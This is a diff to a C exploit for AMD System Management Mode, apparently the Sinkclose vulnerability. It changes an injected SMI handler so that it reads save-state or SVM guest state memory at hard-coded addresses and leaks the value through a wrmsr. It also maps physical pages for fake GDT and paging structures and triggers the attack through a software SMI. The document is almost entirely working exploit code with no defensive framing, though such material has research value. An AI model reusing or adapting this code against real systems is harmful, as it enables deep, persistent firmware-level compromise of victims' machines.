@@ -193,6 +193,7 @@ __attribute__((ms_abi))
 #define SIGNATURE_32(A, B, C, D)               (SIGNATURE_16 (A, B) | (SIGNATURE_16 (C, D) << 16))
 #define MM_MMST_SIGNATURE                      SIGNATURE_32 ('S', 'M', 'S', 'T')
 #define SMST_ALLOCATE_POOL_FUNC_OFFSET         0x50
+#define SMST_CPU_SAVE_STATE                    0x50 + 0x8 * 8
 #define SMST_LOCATE_PROTOCOL_FUNC_OFFSET       0xD0
 #define SMST_SMI_HANDLER_REGISTER_FUNC_OFFSET  0xE0
 
@@ -406,14 +407,6 @@ UINT32 get_x64_staging_size() {
     return section_size;
 }
 
-/// Set the TClose
-void set_tclose_for_core(UINT32 core_id) {
-    UINT64 tseg_mask = 0;
-    do_read_msr_for_core(core_id, AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
-    tseg_mask = tseg_mask | (0b11 << 2);
-    do_write_msr_for_core(core_id, AMD_MSR_SMM_TSEG_MASK, tseg_mask);
-}
-
 
 /*
     0000: 00 00 00 00 00 00 00 00 ff ff 00 00 00 9b cf 00
@@ -426,7 +419,7 @@ void set_tclose_for_core(UINT32 core_id) {
     0070: 00 00 00 00 00 00 00 00 04 00 00 00 00 f5 40 00
 */
 
-// Access and granularity flags structure
+// X86 segment descriptor (32-bit)
 struct SegmentDescriptor {
     uint16_t limit_low;          // Lower 16 bits of the segment limit
     uint16_t base_low;           // Lower 16 bits of the base address
@@ -548,18 +541,6 @@ struct x_mapping {
     UINT32 num_tables;
     void  **tables;
 };
-
-static void print_mapping(struct x_mapping *mapping) {
-    printf("VA: %016llx\n", mapping->vaddr);
-    printf("   PML4-i: %x\n", (mapping->vaddr >> 39) & 0b111111111);
-    printf("   PDPT-i: %x\n", (mapping->vaddr >> 30) & 0b111111111);
-    printf("     PD-i: %x\n", (mapping->vaddr >> 21) & 0b111111111);
-    printf("     PT-i: %x\n", (mapping->vaddr >> 12) & 0b111111111);
-
-    printf("Size: %08x | Aligned-Size: %08x\n", mapping->size, mapping->aligned_size);
-    printf("Num of pages : %d\n", mapping->num_pages);
-    printf("Num of tables: %d\n", mapping->num_tables);
-}
 
 
 /// @brief  Creates a large buffer mapping (16 MBs) into the paging tables
@@ -709,12 +690,6 @@ void prepare_paging(
 {
 
 
-    // if (is_5_level_paging()) {
-    //     printf("error: add support for pml5\n");
-    //     exit(-1);
-    // }
-
-    
     void *pml4 = map_physical_memory(CORE0_PML4, PAGE_SIZE);
     memset(pml4, 0x00, PAGE_SIZE);
 
@@ -938,9 +913,53 @@ smi_handler(
         UINT32 *squirrel = (UINT32 *) SQUIRREL_BAR;
         squirrel[0] = 0xAAAAAAAA;
     #endif
-    UINT32 *MEMSTART = (UINT32 *) 0x0000;
-    MEMSTART[0] = 0xCAFEBABE;
+    
+    // offset for rip in save state area
+    //uint32_t *ptr = (uint32_t *)(0xafe3d000 + 0xFF78);
+    // offset for SVM Guest State Area
+    uint32_t *ptr = (uint32_t *)(0xafe3d000 + 0xFED8);
+    uint32_t value = *ptr;
+    //uint32_t value = 0xCAFEBABE;
+    
+    __asm__ volatile (
+        "wrmsr"
+        :
+        : "c"(0xC0011001), "a"(value)
+        : "memory"
+    );
+    /* This crashes the SMM .... probably 0x000 not mapped? */
+    //UINT32 *MEMSTART = (UINT32 *)0x0000;
+    //MEMSTART[0] = 0xCAFEBABE;
+    return;
 }
+
+/* smi_handler_save_state_copy (
+    EFI_HANDLE  DispatchHandle,
+    void  *DispatchContext,
+    void        *SwContext,
+    UIN32   *SizeOfSwContext
+    )
+{
+    EFI_SMM_CPU_PROTOCOL *SmmCpu;
+    EFI_STATUS Status;
+    UINTN ProcessorIndex;
+    VOID *SaveState;
+    UINTN SaveStateSize;
+
+    EFI_GUID gEfiSmmCpuProtocolGuid = {
+        0xeb346b97, 
+        0x975f, 
+        0x4a9f, 
+        {0x8b, 0x22, 0xf8, 0xe9, 0x2b, 0xb3, 0xd5, 0x69},
+    };
+
+    EFI_LOCATE_PROTOCOL SmmLocateProtocol = (EFI_LOCATE_PROTOCOL) 
+                            *(UINT64 *)((char *)SaveState + SMST_LOCATE_PROTOCOL_FUNC_OFFSET);
+    
+    void*  save_state = (void *)gMmst->CpuSaveState[0];
+    return EFI_SUCCESS;
+} */
+
 #ifdef _WIN32
 #pragma code_seg()
 #endif
@@ -1007,28 +1026,12 @@ static void print_desc(struct SegmentDescriptor *sec_desc) {
     printf("--------------------------\n");
 }
 
-static void do_page_walk(UINT64 crbase, UINT64 addr){
-    void* basePTR = map_physical_memory(CORE0_PML4, PAGE_SIZE);
-
-    UINT64 pml4e = (addr >> 39) & 0x1FF;
-    UINT64 pdpte = (addr >> 30) & 0x1FF;
-    UINT64 pde = (addr >> 21) & 0x1FF;
-
-    UINT64 pml4e_addr = ((UINT64*)basePTR)[pml4e];
-    // Clear the lower 12 bits
-    printf("PML4E: %016llx\n", pml4e_addr);
-    pml4e_addr &= ~(0xFFFULL);
-    unmap_physical_memory(basePTR, PAGE_SIZE);
-    printf("PML4E: %016llx\n", pml4e_addr);
-
-/*     void *pdpt = map_physical_memory(pml4e_addr, PAGE_SIZE);
-
-    UINT64 pdpte_addr = ((UINT64*)pdpte)[pdpte];
-    unmap_physical_memory(pdpt, PAGE_SIZE); */
-}
-
 extern void amd_print_smm_tseg_addr_for_core(int core);
 
+/*
+ * main core **MUST** be different from 0
+ * otherwise SMI will be broadcast and exploit will fail
+*/
 void sinkclose_exploit()
 {
     BOOL res;
@@ -1060,13 +1063,13 @@ void sinkclose_exploit()
     hexdump((char*)gdt_physpage, 0x60, 0x00000000);
     free(gdt);
 
-    struct SegmentDescriptor *sec_desc = (struct SegmentDescriptor *) &FAKE_GDT;
-    printf("--- 32 Bit CS Descriptor ---\n");
-    print_desc(&sec_desc[1]);
-    printf("--- 64 Bit CS Descriptor ---\n");
-    print_desc(&sec_desc[7]);
-    printf("--- 32 Bit DS Descriptor ---\n");
-    print_desc(&sec_desc[3]);    
+    //struct SegmentDescriptor *sec_desc = (struct SegmentDescriptor *) &FAKE_GDT;
+    //printf("--- 32 Bit CS Descriptor ---\n");
+    //print_desc(&sec_desc[1]);
+    //printf("--- 64 Bit CS Descriptor ---\n");
+    //print_desc(&sec_desc[7]);
+    //printf("--- 32 Bit DS Descriptor ---\n");
+    //print_desc(&sec_desc[3]);    
 
     unmap_physical_memory(gdt_physpage, PAGE_SIZE);
 
@@ -1101,11 +1104,16 @@ void sinkclose_exploit()
         exit(-1);
     }
 
+    if (stack_page.pa == 0){
+        printf("Stack: %016llx\n", stack_page.pa);
+        printf("REREUN with sudo\n");
+        return;
+    }
+
     // probe the stack with known values
     for (int i = 0; i < PAGE_SIZE >> 2; i++) {
         ((UINT32 *)stack_page.va)[i] = 0xBADAB0B0;
     }
-
 
     // c. create aux buff for passing data
     struct alloc_user_physmem aux_data_page = {0};
@@ -1116,15 +1124,9 @@ void sinkclose_exploit()
 
     // Reserver a page for the PDPT
     struct alloc_user_physmem pdpt_page = {0};
-    if (alloc_user_mem(PAGE_SIZE, &pdpt_page) == FALSE) {
-        printf("failed to allocate page for PDPT\n");
-        exit(-1);
-    }
-    if (pdpt_page.pa == 0){
-        printf("PDPT: %016llx\n", pdpt_page.pa);
-        printf("REREUN with sudo\n");
-        return;
-    }
+    pdpt_page.va = (UINT64)map_physical_memory(0x3000, PAGE_SIZE);
+    pdpt_page.pa = 0x3000;
+    pdpt_page.size = PAGE_SIZE;
 
     memset((void *)pdpt_page.va, 0x00, PAGE_SIZE);
 
@@ -1136,7 +1138,6 @@ void sinkclose_exploit()
         aux_data_page.pa 
     );
 
-    do_page_walk(CORE0_PML4, 0x00000000);
     // Setup the aux buff
 
     struct _x64_staging_aux_data *aux_data = 
@@ -1175,7 +1176,7 @@ void sinkclose_exploit()
     SW_SMI_CALL smi_call = { 0 };
     smi_call.rax = 0x31337;    
 
-    printf("Triggering exploit...\n");         
+    printf("Triggering exploit...(might take a minute to run)\n");         
     // Trigger attack    
     sinkclose_smi(&smi_call);
     
